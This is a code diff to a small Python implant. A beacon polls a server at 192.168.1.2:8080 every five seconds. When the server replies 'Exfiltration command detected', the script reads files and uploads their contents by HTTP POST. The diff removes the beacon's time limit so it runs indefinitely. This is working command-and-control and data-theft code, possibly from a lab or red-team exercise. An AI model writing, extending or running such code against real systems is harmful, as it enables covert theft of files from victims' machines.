@@ -6,11 +6,15 @@ from os.path import isfile, join
 ## Send out beacons for 60secs at 5secs interval
 def beacon():
     start_time = time.time()
-    url = 'http://localhost:8080'
+    url = 'http://192.168.1.2:8080'
     while True:
-        requests.get(url=url)
-        if (time.time() - start_time) > 60:
-            break
+        r = requests.get(url=url)
+
+        ## Exfiltrate command sent from server
+        if r.text == 'Exfiltration command detected':
+            exfiltration()
+        # if (time.time() - start_time) > 60:
+        #     break
         time.sleep(5)
 
 def exfiltration():
@@ -24,13 +28,13 @@ def exfiltration():
             content = open(f,"rb").read()
             
             ## Sending out data
-            url = 'http://localhost:8080'
+            url = 'http://192.168.1.2:8080'
             custom_headers = {'filename':f}
             r = requests.post(url = url, headers = custom_headers, data = content)
 
 def main():
-    exfiltration()
-    # beacon()
+    #exfiltration()
+    beacon()
     
 if __name__=="__main__":
     main()
